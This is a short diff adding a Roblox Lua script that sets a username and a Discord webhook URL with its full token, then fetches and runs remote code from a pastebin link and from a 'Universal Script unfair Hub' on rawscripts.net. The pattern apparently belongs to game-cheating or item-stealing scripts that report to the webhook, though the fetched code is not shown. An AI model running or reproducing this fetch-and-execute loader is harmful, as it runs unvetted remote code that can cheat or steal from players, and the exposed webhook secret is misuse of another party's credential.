@@ -1,0 +1,5 @@
+UserName = "BeginnerLuckIsDaBest"
+WebHook = "https://discord.com/api/webhooks/1294522318495944744/tDvdrx9Q4IvIn5L2NrOfBJpzgpAT4ettnLJHdwQTOQqXwzeBD6g72WLsw2IzuqaJnn0u"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/ahGVHZhj"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-unfair-Hub-3936"))()
